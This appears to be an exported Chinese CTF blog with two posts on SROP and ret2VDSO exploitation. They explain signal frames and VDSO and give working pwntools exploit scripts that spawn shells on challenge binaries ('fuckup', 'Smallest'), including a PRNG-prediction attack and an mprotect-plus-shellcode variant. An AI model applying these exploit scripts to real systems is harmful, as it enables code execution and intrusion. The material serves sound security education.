{"meta":{"title":"AssassinQ","subtitle":null,"description":"ZJGSU-IS-17","author":null,"url":"blog.b3ale.cn"},"pages":[{"title":"About Me","date":"2017-09-14T07:05:23.000Z","updated":"2020-03-16T03:06:06.187Z","comments":true,"path":"about/index.html","permalink":"blog.b3ale.cn/about/index.html","excerpt":"","text":"Education Duration School Majar 2017-Now Zhejiang Gongshang University Information Security Working Experiences Duration Company Job 2019.8-2019.9 NSFocus Hangzhou Office Security Service Engineer(Intern) ContractE-Mail: assassinqkeepshumble[at]gmail.com"},{"title":"tags","date":"2018-04-19T06:24:45.000Z","updated":"2018-04-19T06:49:25.000Z","comments":true,"path":"tags/index.html","permalink":"blog.b3ale.cn/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Use SROP with ret2VDSO","slug":"Use-SROP-with-ret2VDSO","date":"2020-03-14T02:24:24.000Z","updated":"2020-03-15T06:44:41.488Z","comments":true,"path":"2020/03/14/Use-SROP-with-ret2VDSO/","link":"","permalink":"blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/","excerpt":"用 SROP 的时候，一般情况下很难找得到 syscall ; ret，这时就需要在 VDSO 中找了。","text":"用 SROP 的时候，一般情况下很难找得到 syscall ; ret，这时就需要在 VDSO 中找了。 What is VDSOVDSO（Virtual Dynamically-linked Shared Object）是个很有意思的东西，它是虚拟的，与虚拟内存一样，在计算机中本身并不存在。因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。VDSO 将内核态的调用映射到用户态的地址空间中，可以大量减少这样的开销，同时也可以使路径更好。 这里路径更好指的是，不需要使用传统的 int 0x80 来进行系统调用，不同的处理器实现了不同的快速系统调用指令（Intel 实现了 sysenter、sysexit；AMD 实现了 syscall、sysret），由此自然就会出现兼容性问题。所以 Linux 实现了 vsyscall 接口，在底层会根据具体的结构来进行具体操作。而 vsyscall 就实现在 VDSO 中。 Linux（2.6 及以上的版本）环境下执行 ldd /bin/sh，会发现有个名字叫 linux-vdso.so.1（老点的版本是 linux-gate.so.1）的动态文件，而系统中却找不到它，它就是 VDSO。例如： 1234$ ldd /bin/sh linux-vdso.so.1 =&gt; (0x00007ffda1746000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a4da29000) /lib64/ld-linux-x86-64.so.2 (0x00007f9a4e01b000) 不光是快速系统调用，glibc 现在也提供了 VDSO 的支持，open()、read()、write()、gettimeofday() 都可以直接用 VDSO 中的实现，使得这些调用更快，glibc 更兼容，内核新特性在不影响 glibc 的情况下也可以更快的部署。 Why ret2VDSO?在 x86 系统中，传统的系统调用 int 0x80 并没有很好的效果，因此在 Intel 新型的 CPU 提供了新的系统调用指令（2.6 及以上的版本支持新型系统调用机制）： sysenter sysexit VDSO 可以降低在传统的 int 0x80 的额外开销以及提供了 sigreturn 可以使用 SROP。 其中 vsyscall 固定地址中存在 syscall ; ret： 1234assassinq&gt;&gt; x/3i 0xffffffffff600000 0xffffffffff600000: mov rax,0x60 0xffffffffff600007: syscall 0xffffffffff600009: ret 可以写一个程序做一个系统调用的测试： 123456789101112131415161718#include &lt;time.h&gt;#include &lt;stdio.h&gt;typedef time_t (*time_func)(time_t *);int main(int argc, char *argv[]) &#123; time_t tloc; int retval = 0; time_func func = (time_func) 0xffffffffff600000; retval = func(&amp;tloc); if (retval &lt; 0) &#123; perror(\"time_func\"); return -1; &#125; printf(\"%ld\\n\", tloc); return 0;&#125; 总而言之，就是在 VDSO 中存在 syscall ; ret 可以被 SROP 利用。 How ret2VDSO?sysenter 其参数传递方式和 int 0x80 是一样的，但是需要先做好 Function Prologue： 1push ebp ; mov ebp, esp 以及需要找到一个好的 Gadget 来做 Stack Pivot。 ret2VDSO Theory获取 VDSO 的方法： 暴力破解 通过泄漏 使用 ld.so 中的 _libc_stack_end 找到 stack 其实位置，计算 ELF Auxiliary Vector Offset 并从中取出 AT_SYSINFO_EHDR； 使用 ld.so 中的 _rtld_global_ro 的某个 Offset 也有 VDSO 的位置。 尤其注意的是在开了 ASLR 的情况下，VDSO 的利用是有一定优势的 在 x86 环境下：只有一个字节是随机的，所以我们可以很容易暴力解决； 在 x64 环境下：在开启了 PIE 的情形下，有 11 字节是随机的，例如：CVE-2014-9585。但是在 Linux 3.182.2 版本之后，这个已经增加到了 18 个字节的随机 查看存储 VDSO 的地址： 12assassinq&gt;&gt; p &amp;_rtld_global_ro._dl_sysinfo_dso$1 = (const Elf32_Ehdr **) 0xf7ffced4 &lt;_rtld_global_ro+468&gt; 查看 VDSO 的地址（直接 vmmap 也行）： 12assassinq&gt;&gt; p _rtld_global_ro._dl_sysinfo_dso$2 = (const Elf32_Ehdr *) 0xf7fd8000 通过 ELF Auxiliary Vector Offset 计算出 VDSO 的地址（泄露相应的栈上的值）： 123456789101112131415161718192021assassinq&gt;&gt; info auxv32 AT_SYSINFO Special system info/entry points 0xf7fd8b5033 AT_SYSINFO_EHDR System-supplied DSO&apos;s ELF header 0xf7fd8000 &lt;--- Address of VDSO16 AT_HWCAP Machine-dependent CPU capability hints 0x9f8bfbff6 AT_PAGESZ System page size 409617 AT_CLKTCK Frequency of times() 1003 AT_PHDR Program headers for program 0x80480344 AT_PHENT Size of program header entry 325 AT_PHNUM Number of program headers 97 AT_BASE Base address of interpreter 0xf7fd90008 AT_FLAGS Flags 0x09 AT_ENTRY Entry point of program 0x804834011 AT_UID Real user ID 012 AT_EUID Effective user ID 013 AT_GID Real group ID 014 AT_EGID Effective group ID 023 AT_SECURE Boolean, was exec setuid-like? 025 AT_RANDOM Address of 16 random bytes 0xffffd8cb31 AT_EXECFN File name of executable 0xffffdfd8 &quot;/root/tmp/ret2VDSO_Example/main&quot;15 AT_PLATFORM String identifying platform 0xffffd8db &quot;i686&quot;0 AT_NULL End of vector 0x0 事实证明 VDSO 也没有非常随机，可以做一个测试： 1234567891011121314151617181920212223242526$ ldd /bin/ls linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ffff7bb5000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77eb000) libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007ffff757b000) libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7377000) /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ffff715a000)$ while true; do ldd /bin/ls; done | grep 0x00007ffff7ffa000 linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) linux-vdso.so.1 =&gt; (0x00007ffff7ffa000) ... Example32 位下对 VDSO 进行爆破。程序如下，读入 0x400 的字节，足够塞一个构造的 sigcontext 了： 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char buf[10] = \"/bin/sh\\x00\";void pwnme() &#123; char s[0x100]; char *welcome = \"&gt; \"; write(1, welcome, 2); read(0, s, 0x400);&#125;int main() &#123; pwnme(); return 0;&#125; 同时，我们在 VDSO 中可以找到 sigreturn 所对应的调用： 1234assassinq&gt;&gt; x/3i 0xf7fd8b71 0xf7fd8b71 &lt;__kernel_sigreturn+1&gt;: mov eax,0x77 0xf7fd8b76 &lt;__kernel_sigreturn+6&gt;: int 0x80 0xf7fd8b78 &lt;__kernel_sigreturn+8&gt;: nop 关闭 ASLR 对 ret2VDSO 进行测试： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.terminal = ['lxterminal', '-e']context.arch = 'i386'bin_sh_addr = 0x804a020bss_addr = 0x804a030p = process('./main')#gdb.attach(p)vdso_addr = 0xf7fd8000print 'Try vdso %s' % hex(vdso_addr)payload = 'A' * 0x110frame = SigreturnFrame(kernel=\"i386\")frame.eax = constants.SYS_execveframe.ebx = bin_sh_addrframe.eip = vdso_addr + 0xb76 # address of int 0x80frame.esp = bss_addrframe.ebp = bss_addrframe.gs = 0x63frame.cs = 0x23frame.es = 0x2bframe.ds = 0x2bframe.ss = 0x2bret_addr = vdso_addr + 0xb71 # address of sigreturnpayload += p32(ret_addr) + str(frame)p.recvuntil('&gt; ')p.sendline(payload)p.sendline('echo pwned')data = p.recvuntil('pwned')if data != 'pwned': raise Exception, 'Failed'p.interactive() 打开 ASLR 之后对 VDSO 进行爆破（32 位是 $\\frac{1}{256}$ 的概率）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env pythonfrom pwn import *bin_sh_addr = 0x804a020bss_addr = 0x804a030vdso_range = range(0xf7600000, 0xf7700000, 0x1000)def bruteforce(): global p context.arch = 'i386' p = process('./main') global vdso_addr vdso_addr = random.choice(vdso_range) print 'Try vdso %s' % hex(vdso_addr) payload = 'A' * 0x110 frame = SigreturnFrame(kernel=\"i386\") frame.eax = constants.SYS_execve frame.ebx = bin_sh_addr frame.eip = vdso_addr + 0xb76 # address of int 0x80 frame.esp = bss_addr frame.ebp = bss_addr frame.gs = 0x63 frame.cs = 0x23 frame.es = 0x2b frame.ds = 0x2b frame.ss = 0x2b ret_addr = vdso_addr + 0xb71 # address of sigreturn payload += p32(ret_addr) + str(frame) p.recvuntil('&gt; ') p.send(payload) p.sendline('echo pwned') data = p.recvuntil('pwned') if data != 'pwned': info('Failed') returnif __name__ == '__main__': global p, vdso_addr i = 1 while True: print 'Try %d' % i try: bruteforce() except Exception as e: info('Wrong VDSO') p.close() i += 1 continue info('vdso_addr = ' + hex(vdso_addr)) break p.interactive() Example_x6464 位下使用 AXUV 泄漏 VDSO 的例子。主要是输入一串长为 1024 的字符串： 123456789101112131415161718192021222324252627section .textglobal _startjmp _startvuln:sub rsp, 8mov rax, 0 ; sys_readxor rdi, rdimov rsi, rspmov rdx, 1024syscalladd rsp, 8ret_start:call vulnmov rax, 60 ; sys_exitxor rdi, rdisyscallgadgets:mov rdi, 1retmov rax, 15retsyscallret 尝试利用 vsyscall 中的 syscall ; ret 没能成功，所以在程序后面又加了一个 Gadget 用来构造（具体什么原因没有找到）。在栈上泄漏 AUXV 之后，可以获取 VDSO 的基址以及输入的字符串在栈上的地址。脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'amd64'#context.terminal = ['lxterminal', '-e']p = process('./main')# id's of Auxillary VectorsAT_SYSINFO_EHDR = 0x21AT_HWCAP = 0x10AT_PAGESZ = 0x06AT_CLKTCK = 0x11AT_PHDR = 0x03AT_PHENT = 0x04AT_PHNUM = 0x05AT_BASE = 0x07AT_FLAGS = 0x08AT_ENTRY = 0x09AT_UID = 0x0bAT_EUID = 0x0cAT_GID = 0x0dAT_EGID = 0x0eAT_SECURE = 0x17AT_RANDOM = 0x19AT_EXECFN = 0x1fAT_PLATFORM = 0x0fgdb.attach(p)vuln_addr = 0x400082set_write = 0x4000acsyscall_addr = 0x400096set_sigreturn = 0x4000b2payload = '/bin/sh\\x00'payload += p64(vuln_addr)payload += p64(set_write)payload += p64(syscall_addr)payload += 'A' * 8payload += p64(vuln_addr)raw_input('@')p.send(payload)payload = 'A'raw_input('@')p.send(payload)ENV_AUX_VEC = p.recv(1024)QWORD_LIST = []for i in range(0, len(ENV_AUX_VEC), 8): QWORD_LIST.append(u64(ENV_AUX_VEC[i:i + 8]))start_aux_vec = QWORD_LIST.index(AT_SYSINFO_EHDR) # 计算AUXV的起始地址info(hex(start_aux_vec))AUX_VEC_ENTRIES = QWORD_LIST[start_aux_vec: start_aux_vec + (18 * 2)] # size of auxillary tableAUX_VEC_ENTRIES = dict(AUX_VEC_ENTRIES[i:i + 2] for i in range(0, len(AUX_VEC_ENTRIES), 2))vdso_addr = AUX_VEC_ENTRIES[AT_SYSINFO_EHDR]info(\"vdso_addr = \" + hex(vdso_addr))bin_sh_addr = AUX_VEC_ENTRIES[AT_RANDOM] - 0x379 # 获取“/bin/sh”地址info(\"bin_sh_addr = \" + hex(bin_sh_addr))syscall_ret = 0xffffffffff600007syscall_ret = 0x4000b8frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_addrpayload = 'A' * 8 + p64(set_sigreturn) + p64(syscall_ret) + str(frame)raw_input('@')p.send(payload)p.interactive() fuckup2015 Defcon Quals 中这道题可以使用 ret2VDSO 和 SROP。具体没能复现出来，主要理解一下思想。 1234567$ checksec ./fuckup[*] '/home/beale/Desktop/2015-Defcon-Quals-fuckup/fuckup' Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 总共有五个选项，选项 2 会修改程序段和栈的基址，并重新指向新的地址；选项 3 会告诉我们当前的随机数并再次随机化程序段；选项 4 中可以进行溢出： 1234567891011$ ./fuckupWelcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.This app is to help prove the benefits of F.U.C.K.U.P.Main Menu---------1. Display info2. Change random3. View state info4. Test stack smash-------0. Quit 在选项 2 的代码反编译后可以看到，每次用户执行命令时，程序会根据类似于 WELL512 的生成算法生成的随机数，改变二进制映射的存储器的基址： 123456789101112131415int sub_80481A6()&#123; ... do &#123; seed_1 = WELL512() * 4294967295.0; seed_2 = (signed __int64)seed_1; addy = (void *)(seed_2 &amp; 0xFFFFF000); actual = my_mmap(seed_2 &amp; 0xFFFFF000, 28672, 3, 34, -1, 0, v0, v0); &#125; while ( (seed_2 &amp; 0xFFFFF000) != actual ); qmemcpy(addy, dword_804EB40, 0x7000u); my_mprotect(addy, 0x4000u, 5); ...&#125; 普通的思路肯定是做不了的。使用 VDSO 的思路大致如下： 因为 32 位下 VDSO 只有 1 字节是随机的，可以暴力破解 直接溢出改返回地址，但只有 100 个字节 首先先利用 VDSO 的 Gadget 做出 sys_read 并加大输入的大小 将读入的内容放到 TLS（TLS 的位置在 VDSO 前一页） 使用 sysenter 将栈转移到 TLS 段 在第二次输入的时候将 /bin/sh 放到 TLS 段（这个时候栈已经搬到 TLS 了） 接着把 Sigreturn Gadget 以及 Fake Signal Frame 一并放进，然后可以直接 execve 执行 /bin/sh 循环直到成功 get shell 还可以通过 z3 对伪随机数进行预测，脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#!/usr/bin/env pythonfrom pwn import *from z3 import *import timecontext.log_level = 'debug'context.arch = 'i386'state = [BitVec(\"a1_&#123;0&#125;\".format(i), 32) for i in range(16)]def m(x): return p32(x + offset)def well512(index): idx = (index+15) &amp; 15 a = state[index] c = state[(index+13) &amp; 15] b = a ^ c ^ ((a &lt;&lt; 16) &amp; 0xffffffff) ^ ((c &lt;&lt; 15) &amp; 0xffffffff) c = state[(index+9) &amp; 15] c ^= (c &gt;&gt; 11) state[(index+10) &amp; 15] = c ^ b a = state[idx] d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b state[idx] = a ^ b ^ d ^ ((a &lt;&lt; 2) &amp; 0xffffffff) ^ ( (b &lt;&lt; 18) &amp; 0xffffffff) ^ ((c &lt;&lt; 28) &amp; 0xffffffff) return idxdef well512_z3(index): idx = (index+15) &amp; 15 a = state[index] c = state[(index+13) &amp; 15] b = a ^ c ^ (a &lt;&lt; 16) ^ (c &lt;&lt; 15) c = state[(index+9) &amp; 15] c ^= LShR(c, 11) a = state[idx] state[(index+10) &amp; 15] = b ^ c d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b a = state[idx] state[idx] = a ^ b ^ d ^ (a &lt;&lt; 2) ^ (b &lt;&lt; 18) ^ (c &lt;&lt; 28) return idxdef find_state(recv): info('Start find state.') global state z = Solver() idx = 15 for r in recv: idx = well512_z3(idx) z.add(state[idx] == r + 1) return zp = process('./fuckup')def choice(c): p.recvuntil('Quit\\n') p.sendline(str(c))r_list = []for i in range(15): choice(3) sleep(0.1) r = int(p.recv(0x20)[0x11:0x19], 16) r_list.append(r)info(r_list)z = find_state(r_list)info('Solver result =&gt; ' + str(z.check()))next_state = dict()model = z.model()for i in model: idx = int(str(i)[3:]) val = model[i].as_long() next_state[idx] = valinfo(next_state)for i in range(16): if i in next_state: state[i] = next_state[i]idx = 15for i in range(15): idx = well512(idx)idx = well512(idx)predict_val = state[idx] - 1info('predict_val = ' + hex(predict_val))current_base = 0xfffff000 &amp; predict_valinfo('current_base = ' + hex(current_base))base = 0x8048000offset = current_base - base# 0x0804908f : pop eax ; pop ebx ; pop esi ; retpop_eax_ebx_esi_ret = 0x0804908f# 0x0804961a : pop edx ; pop ecx ; pop ebx ; retpop_edx_ecx_ebx_ret = 0x0804961a# 0x0804875f : int 0x80int_0x80 = 0x0804875fpayload = 'A' * 0x16payload += m(pop_eax_ebx_esi_ret)payload += p32(0x7D)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x7)payload += p32(0x1000)payload += p32(current_base)payload += m(int_0x80)payload += m(pop_eax_ebx_esi_ret)payload += p32(0x3)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x100)payload += p32(current_base)payload += p32(0)payload += m(int_0x80)payload += p32(current_base)payload = payload.ljust(100, 'A')payload += asm(shellcraft.sh())p.sendline('4')p.sendline(payload)p.interactive() Referenceshttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdsohttp://adam8157.info/blog/2011/10/linux-vdso/https://bestwing.me/stack-overflow-three-SROP.htmlhttps://www.anquanke.com/post/id/85810https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.htmlhttps://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/https://pwnexpoit.tistory.com/13","categories":[],"tags":[{"name":"ctf，pwn","slug":"ctf，pwn","permalink":"blog.b3ale.cn/tags/ctf，pwn/"}]},{"title":"Understanding SigReturn-Oriented-Programming","slug":"Understanding-SigReturn-Oriented-Programming","date":"2020-03-13T08:07:27.000Z","updated":"2020-03-14T03:17:29.492Z","comments":true,"path":"2020/03/13/Understanding-SigReturn-Oriented-Programming/","link":"","permalink":"blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/","excerpt":"去年学 ROP 的时候遗漏的一个技术。","text":"去年学 ROP 的时候遗漏的一个技术。 What is SROPSROP（Sigreturn Oriented Programming）于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究 Framing Signals — A Return to Portable Shellcode 发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。 其中，Sigreturn 是一个系统调用，在类 Unix 系统发生 Signal 的时候会被间接地调用。 SignalSignal 机制是类 Unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示： 首先内核向某个用户态进程发送 Signal 时，该进程会被暂时挂起并进入内核态； 内核会为该进程保存上下文（类似于保存函数现场，将所有寄存器压入栈，以及压入 Signal 的信息和指向 Sigreturn 的系统调用地址），存储完毕后，回到用户态； 接着使用用户态中注册过的 Signal Handler 处理相应的 Signal； 处理完毕后回到内核态，内核执行 Sigreturn 系统调用（32 位的调用号为 77，64 位的调用号为 15），将对应进程的上下文恢复，最后回到用户态。 在保存进程上下文的时候，用户态的栈中的结构如下。其中 ucontext 以及 siginfo 这一段被称为 Signal Frame，在 Signal Handler 执行完之后，就会执行 Sigreturn 代码： Signal Frame 在不同架构下不同。在 x86 中的 sigcontext 结构体如下： 123456789101112131415161718192021222324struct sigcontext &#123; __u16 gs, __gsh; __u16 fs, __fsh; __u16 es, __esh; __u16 ds, __dsh; __u32 edi; __u32 esi; __u32 ebp; __u32 esp; __u32 ebx; __u32 edx; __u32 ecx; __u32 eax; __u32 trapno; __u32 err; __u32 eip; __u16 cs, __csh; __u32 eflags; __u32 esp_at_signal; __u16 ss, __ssh; struct _fpstate __user *fpstate; // FPU寄存器状态 __u32 oldmask; __u32 cr2;&#125;; 在 x64 中的 sigcontext 结构体如下： 123456789101112131415161718192021222324252627282930struct sigcontext &#123; __u64 r8; __u64 r9; __u64 r10; __u64 r11; __u64 r12; __u64 r13; __u64 r14; __u64 r15; __u64 rdi; __u64 rsi; __u64 rbp; __u64 rbx; __u64 rdx; __u64 rax; __u64 rcx; __u64 rsp; __u64 rip; __u64 eflags; /* RFLAGS */ __u16 cs; __u16 gs; __u16 fs; __u16 __pad0; __u64 err; __u64 trapno; __u64 oldmask; __u64 cr2; struct _fpstate __user *fpstate; /* Zero when no FPU context */ __u64 reserved1[8];&#125;; SROP Theory在 Signal 机制的整个过程中，内核所做的主要工作就是为进程保存上下文以及恢复上下文。所改变的 Signal Frame 是处在用户的地址空间中的，所以可以得出一下结论： Signal Frame 可以被用户读写； 因为内核没有直接参与 Signal，所以内核并不知道保存的 Signal Frame 是否是真正的进程上下文（即执行 Sigreturn 的时候）。 那么就可以构造出假的 Signal Frame，提前把 RDI、RSI、RIP 等寄存器的值放在构造的结构体中，执行完 Sigreturn 后就会给各个寄存器设置好值。构造 SROP 的条件如下： 可以通过栈溢出来控制栈 需要知道一些地址 &amp;&quot;/bin/sh&quot; Signal Frame Gadget：syscall ; ret Sigreturn 需要有足够大的空间来放下 Signal Frame 在 pwntools 中也集成了 SROP 的工具，即 SigreturnFrame()，用于构造假的 sigcontext 结构体（Signal Frame）。 Example我们可以自行构造一个程序，使用 SROP 进行一个简单的利用： 12345678910111213141516171819202122232425262728293031char buf[0x200];int main()&#123; asm( // 读取 0x200 字节 \"mov rax, 0\\n\" // sys_read \"mov rdi, 0\\n\" // fd \"lea rsi, %0\\n\" // buf \"mov rdx, 0x200\\n\" // count \"syscall\\n\" // 恢复进程上下文 \"mov rax, 15\\n\" // sys_rt_sigaction \"mov rdi, 0\\n\" \"mov rsp, rsi\\n\" // 把buf作为栈 // syscall 的 symbol，便于查找 \"syscall:\\n\" \"syscall\\n\" \"jmp exit\\n\" // 退出程序 \"exit:\\n\" \"mov rax, 60\\n\" // sys_exit \"mov rdi, 0\\n\" \"syscall\\n\" : : \"m\" (buf) : );&#125; 构造出 Signal Frame，并在 buf 上设置好字符串，发送 payload 后拿到 shell： 1234567891011121314151617181920212223#!/usr/bin/env pythonfrom pwn import *context.arch = 'amd64'context.log_level = 'debug'p = process('./main')elf = ELF('./main')#gdb.attach(p)# 构造假的Signal Frameframe = SigreturnFrame()frame.rax = constants.SYS_execve # 设置系统调用号为sys_execveframe.rdi = elf.symbols['buf'] + 0x100 # 设置第一个参数为偏移0x100处的“/bin/sh”字符串frame.rsi = 0frame.rdx = 0frame.rip = elf.symbols['syscall']payload = str(frame).ljust(0x100, 'A') + '/bin/sh\\x00' # 设置payloadp.send(payload)p.interactive() 调试的时候可以看到 Sigreturn 后各个寄存器被设置的值，然后就能调用 execve 的系统调用了： 12345678910111213141516171819202122232425262728293031323334353637383940414243──────────────────────────────────── Code ──────────────────────────────────── 0x40010a &lt;main+34&gt;: mov rax,0xf 0x400111 &lt;main+41&gt;: mov rdi,0x0 0x400118 &lt;main+48&gt;: mov rsp,rsi=&gt; 0x40011b &lt;main+51&gt;: syscall 0x40011d &lt;main+53&gt;: jmp 0x40011f &lt;main+55&gt; 0x40011f &lt;main+55&gt;: mov rax,0x3c 0x400126 &lt;main+62&gt;: mov rdi,0x0 0x40012d &lt;main+69&gt;: syscall────────────────────────────── System call info ──────────────────────────────rt_sigreturn()───────────────────────────────── SROP info ────────────────────────────────── ss_size:0x0000000000000000 rsi:0x0000000000000000 rax:0x000000000000003b rbp:0x0000000000000000 eflags:0x0000000000000000 rcx:0x0000000000000000 rip:0x000000000040011b r13:0x0000000000000000 cr2:0x0000000000000000 r12:0x0000000000000000 rbx:0x0000000000000000 uc_link:0x0000000000000000 err:0x0000000000000000 trapno:0x0000000000000000 r10:0x0000000000000000 ss_flags:0x0000000000000000 ss_sp:0x0000000000000000 rdi:0x0000000000600280 uc_flags:0x0000000000000000 r14:0x0000000000000000 r8:0x0000000000000000 selector:0x0000000000000033 r9:0x0000000000000000 rdx:0x0000000000000000 rsp:0x0000000000000000 oldmask:0x0000000000000000 r11:0x0000000000000000 r15:0x0000000000000000...──────────────────────────────────── Code ──────────────────────────────────── 0x40010a &lt;main+34&gt;: mov rax,0xf 0x400111 &lt;main+41&gt;: mov rdi,0x0 0x400118 &lt;main+48&gt;: mov rsp,rsi=&gt; 0x40011b &lt;main+51&gt;: syscall 0x40011d &lt;main+53&gt;: jmp 0x40011f &lt;main+55&gt; 0x40011f &lt;main+55&gt;: mov rax,0x3c 0x400126 &lt;main+62&gt;: mov rdi,0x0 0x40012d &lt;main+69&gt;: syscall────────────────────────────── System call info ──────────────────────────────execve(const char *name = 0x600280,const char *const *argv = 0x0,const char *const *envp = 0x0)const char *name : 0x600280 --&gt; 0x68732f6e69622f (&apos;/bin/sh&apos;)const char *const *argv : 0x0const char *const *envp : 0x0 Smallest程序只开了 NX，Got 表可写、没有 Canary 保护、没开 PIE： 1234567$ checksec ./smallest[*] '/home/beale/SROP/2017-360Chunqiu-Smallest/smallest' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Analysis2017 年 360 春秋杯的 Smallest 可以用 SROP 实现利用。程序由汇编实现，整体只有几条语句： 1234567891011121314$ objdump -d ./smallest -M intel./smallest: file format elf64-x86-64Disassembly of section .text:00000000004000b0 &lt;.text&gt;: 4000b0: 48 31 c0 xor rax,rax 4000b3: ba 00 04 00 00 mov edx,0x400 4000b8: 48 89 e6 mov rsi,rsp 4000bb: 48 89 c7 mov rdi,rax 4000be: 0f 05 syscall 4000c0: c3 ret 可以看到 4000be 处的是 syscall ; ret，可以作为利用。而整个程序，是实现了一个 read 的系统调用，总共读 0x400 个字节到栈上。利用方法是先泄露出一个栈上的地址，然后通过 SROP 构造一个 read 调用往这个已知的地址上写数据，并再次利用 SROP 构造一个 execve 的调用；第二种方法是使用 mprotect 将不可执行的栈改为 rwx，然后执行 shellcode。 Exploit脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/env python#-*- encoding=utf-8 -*-from pwn import *context.arch = 'amd64'context.log_level = 'debug'#context.terminal = ['lxterminal', '-e']p = process('./smallest')elf = ELF('./smallest')#gdb.attach(p)main_addr = 0x4000b0syscall_addr = 0x4000bepayload = p64(main_addr) * 3 # 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入raw_input('@main*3')p.send(payload)payload = '\\xb3' # 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址raw_input('@leak stack')p.send(payload)p.recv(8)stack_addr = u64(p.recv(8))info('stack_addr = ' + hex(stack_addr))payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_read # sys_read的调用号frame.rdi = 0frame.rsi = stack_addrframe.rdx = 0x400frame.rsp = stack_addrframe.rip = syscall_addrpayload += str(frame) # 读0x400个字节到新的栈上，并把栈搬到新的栈上raw_input('@fake sigcontext to pivot stack')p.send(payload)payload = p64(syscall_addr).ljust(15, 'A') # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input('@set rax=15')p.send(payload)# 下面开始往新的栈上写东西bin_sh_addr = stack_addr + 2 * 8 + len(SigreturnFrame()) # 设置“/bin/sh”字符串的地址payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_execve # sys_execve的调用号frame.rdi = bin_sh_addrframe.rip = syscall_addrpayload += str(frame) + '/bin/sh\\x00' # 开shellraw_input('@fake sigcontext to exec shell')p.send(payload)payload = p64(syscall_addr).ljust(15, 'A') # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input('@set rax=15')p.send(payload)p.interactive() 第二种方法即在新的栈上写东西时构造出 mprotect 的调用，并添加 shellcode： 123456789101112payload = p64(main_addr) + p64(syscall_addr)frame = SigreturnFrame()frame.rax = constants.SYS_mprotectframe.rdi = stack_addr &amp; 0xfffffffffffff000frame.rsi = 0x1000frame.rdx = 0x7frame.rsp = stack_addr + 0x108 # 设置栈的位置frame.rip = syscall_addrpayload += str(frame)payload += p64(stack_addr + 0x110) # 设置return的地址payload += asm(shellcraft.sh())p.send(payload) ciscn_2019_s_3保护和上面开的一样： 